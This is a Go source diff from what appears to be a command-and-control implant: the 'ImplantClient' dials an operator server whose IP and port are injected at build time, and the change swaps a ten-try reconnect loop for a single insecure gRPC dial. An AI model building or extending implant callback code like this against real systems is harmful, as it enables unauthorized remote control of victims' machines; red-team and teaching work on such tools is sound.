@@ -35,6 +35,7 @@ func main() {
 		conn   *grpc.ClientConn
 		err    error
 		client grpcapi.ImplantClient //created generically from the protoc compiler.
+
 	)
 	//debug print statement, making sure the build command works
 	//fmt.Printf("[:] UUID is: %s\n", uuid)
@@ -48,24 +49,12 @@ func main() {
 	//a not-so ismple fix might be to just bite the bullet and assign a self-signed SSL cert that expires i the year 2090 or something.
 	//according to foum posts, "grpc.Dial(":9950", grpc.WithTransportCredentials(insecure.NewCredentials()))" is also a way to do this.
 	//https://stackoverflow.com/questions/70482508/grpc-withinsecure-is-deprecated-use-insecure-newcredentials-instead
-	opts = append(opts, grpc.WithInsecure()) //we would need to alter this to include the certificate
+	opts = append(opts, grpc.WithInsecure()) //we would need to alter this to include the certificate and backoff/reconnect
 	//connect to server application
-	/*if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 5000), opts...); err != nil {
-		log.Fatal(err)
-		//do something here to try to reconnect. for now, it just dies when it fails.hero organization
-	}*/
 	//new version with compile injection
-	for i := 0; i < 10; i++ {
-		//attempt a connection
-		if conn, err = grpc.Dial(fmt.Sprintf("%s:%d", ip, port_num), opts...); err != nil { //add timeout connectoin rules here
-			//sleep
-			time.Sleep(8 * time.Second)
-			//log.Fatal(err)
-		} else {
-			//debug print
-			//fmt.Println("[+] Connection Success")
-			break
-		}
+	//attempt a connection
+	if conn, err = grpc.Dial(fmt.Sprintf("%s:%d", ip, port_num), opts...); err != nil { //add timeout connectoin rules here
+		log.Fatal(err)
 	}
 	//clean up only on exit
 	defer conn.Close()
